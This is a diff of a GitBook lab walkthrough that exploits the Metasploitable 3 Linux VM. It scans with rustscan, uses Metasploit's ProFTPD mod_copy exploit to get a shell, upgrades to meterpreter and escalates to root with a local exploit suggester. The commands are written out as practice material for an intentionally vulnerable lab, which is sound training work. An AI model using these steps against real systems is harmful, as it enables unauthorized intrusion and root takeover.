@@ -1,10 +1,4 @@
----
-description: >-
-  This page is showing different attacks made on the metasploit 3 linux lab,
-  showing how to exploit different vulnerable service on the machine
----
-
-# Linux
+# FTP ENUMERATION
 
 **Rustscan**
 
@@ -12,7 +6,7 @@ description: >-
 rustscan -a 192.168.43.111 -- -sV -oN meta3_nmap
 ```
 
-<figure><img src="../.gitbook/assets/scan1.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/scan1.png" alt=""><figcaption></figcaption></figure>
 
 ```
 Open 192.168.43.111:21
@@ -46,7 +40,7 @@ We see that FTP has a version of <mark style="background-color:purple;">ProFTPD 
 searchsploit ProFTPD 1.3.5
 ```
 
-<figure><img src="../.gitbook/assets/ftp1.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/ftp1.png" alt=""><figcaption></figcaption></figure>
 
 Now we see we have some code being used with metasploit, lets start the service see if we might get access to the server.
 
@@ -56,7 +50,7 @@ msfconsole
 
 And if the service is opened search for the same FTP version you searched earlier and you will see we some exploit.&#x20;
 
-<figure><img src="../.gitbook/assets/msf1.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/msf1.png" alt=""><figcaption></figcaption></figure>
 
 ```shell
 use exploit/unix/ftp/proftpd_modcpoy_exec
@@ -68,11 +62,11 @@ use exploit/unix/ftp/proftpd_modcpoy_exec
 3. run
 ```
 
-<figure><img src="../.gitbook/assets/ftp2.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/ftp2.png" alt=""><figcaption></figcaption></figure>
 
 Even though have a Exploit aborted due to failure message go no check you sessions, you have a session started.&#x20;
 
-<figure><img src="../.gitbook/assets/ftp3.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/ftp3.png" alt=""><figcaption></figcaption></figure>
 
 Now if you want to get your shell you type ==sessions 1== but if you want to use a meterpreter session you have to upgrade your session
 
@@ -82,9 +76,9 @@ sessions -u 1
 
 Anew meterpreter session will be started and you re set to do what ever you want on the machine&#x20;
 
-<figure><img src="../.gitbook/assets/ftp4.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/ftp4.png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../.gitbook/assets/ftp5.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/ftp5.png" alt=""><figcaption></figcaption></figure>
 
 You type <mark style="background-color:blue;">shell</mark> in your meterpreter to get the shell of the machine but first you need a interactive shell ,
 
@@ -92,7 +86,7 @@ You type <mark style="background-color:blue;">shell</mark> in your meterpreter t
 /bin/bash -i
 ```
 
-<figure><img src="../.gitbook/assets/shel1.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/shel1.png" alt=""><figcaption></figcaption></figure>
 
 #### #Privilege escalation
 
@@ -105,7 +99,7 @@ After having upgraded our shell to meterpreter we need to find the privilege esc
 4. run
 ```
 
-<figure><img src="../.gitbook/assets/suggester.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/suggester.png" alt=""><figcaption></figcaption></figure>
 
 After our scripts runs, we seen that this machine is vulnerable to 4 attacks. and if one is successful we should get access to a root user.
 
@@ -119,7 +113,7 @@ After our scripts runs, we seen that this machine is vulnerable to 4 attacks. an
 
 Now we set our session to the second session upgraded to meterpreter which is id 2 and then we our lport(attack's ip address) later we only set a new port, this should not be in use by any application and then run your exploit. A meterpreter session is pwned and by changing to the interactive shell shell we seen we an root user and this can also be confirmed by running ID command which also show you the same.&#x20;
 
-<figure><img src="../.gitbook/assets/root (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/root (2).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../.gitbook/assets/all.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/all.png" alt=""><figcaption></figcaption></figure>
 
